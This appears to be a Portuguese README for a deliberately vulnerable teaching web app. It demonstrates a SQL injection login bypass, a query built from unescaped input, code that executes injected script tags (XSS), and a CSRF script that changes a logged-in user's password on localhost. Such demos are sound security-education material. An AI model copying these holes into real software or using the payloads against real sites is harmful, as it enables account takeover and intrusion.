# Endpoints da API

## Postman

https://www.postman.com/payload-astronaut-55560118/neandertais/collection/37fuatq/vulnerabilidades?share=true


--- 
# COMO RODAR AS VULNERABILIDADES

## SQL Injection 

1 - Quando digitamos `" OR "1"="1` no campo de e-mail  conseguimos fazer login mesmo sem credenciais corretas

https://github.com/user-attachments/assets/67b0d9d1-da18-4db9-ab24-6decab26bb59


2 - Essa falha acontece quando os dados fornecidos pelo usuário são inseridos diretamente dentro de um comando SQL, sem qualquer tipo de proteção ou tratamento. Nesse caso, o conteúdo malicioso enviado é interpretado como parte da lógica do banco de dados.

Exemplo de vulnerabilidade no código  👇 

```js
  const query = await pool.query(
    `
    SELECT
      id,
      nome,
      email
    from usuario
    where 1 = 1
    and email = "${email}" // obs: O campo email está vulnerável para SQL Injections:
    and senha = "${senha}"
    `
  );
```

## XXS (Cross-site scripting)

1 - XSS é uma vulnerabilidade que permite a um atacante injetar scripts maliciosos (JavaScript) em páginas web visualizadas por outros usuários.  
Exemplo de código que injeta script
```js
 const salvar = () => {
    const nomeInput = document.getElementById('wl') as HTMLInputElement;
    const resultado = document.getElementById('resultado');

    if (nomeInput && resultado) {
      resultado.innerHTML = nomeInput.value;

      const scripts = resultado.querySelectorAll('script');

      scripts.forEach(script => {
        const novoScript = document.createElement('script');
        if (script.innerText) {
          // insere o script dentro do html
          novoScript.innerText = script.innerText;
          document.body.appendChild(novoScript);
        }
      });
    }
  }
```
2 - Esse código, quando inserido em um campo de entrada (formulário) e exibido no HTML sem tratamento, executará um alerta, isso indica vulnerabilidade XSS.
```js
<script>alert('XSS')</script>
```

## Cross-Site Request Forgery (CSRF)

1 - Necessário fazer login da pagina original

https://github.com/user-attachments/assets/c6f8c93f-76e1-4d5b-81af-a89eb2277225

2 - Após o usuário realizar o login no site oficial, os cookies de autenticação são armazenados no navegador. Esses cookies podem ser aproveitados por outra página web para enviar uma solicitação maliciosa, como, por exemplo, para a rota localhost:5000/api/updateSenha.


https://github.com/user-attachments/assets/af4c2424-6f6b-4a90-bf39-9a448ca09916

3 - Dessa forma, o cookie do usuário autenticado é enviado ao servidor na solicitação, permitindo que um atacante altere a senha do usuário de maneira maliciosa, explorando a ausência de proteções adequadas, como validação de tokens CSRF.

Exemplo do script do atacante:
```js
      const hackerAlteraSenha = async () => {
        fetch("http://localhost:5000/api/userPassword", {
          method: "PUT",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            novaSenha: "senhahackeada",
          }),
        })
          .then((res) => {
            if (!res.ok) {
              return res.json().then((data) => {
                throw new Error(data.message || "Erro desconhecido");
              });
            }
            return res.json();
          })
          .then((data) => {
            if (data.success) {
              console.log({ data });

              alert("Senha alterada!");
            }
          })
          .catch((error) => {
            console.error("Erro:", error.message);
          });
      };
```
4 - Conclusão, no banco de dados a senha do usuário foi alterada.

![image](https://github.com/user-attachments/assets/5cb42999-9207-4030-8a84-5be76804a93d)

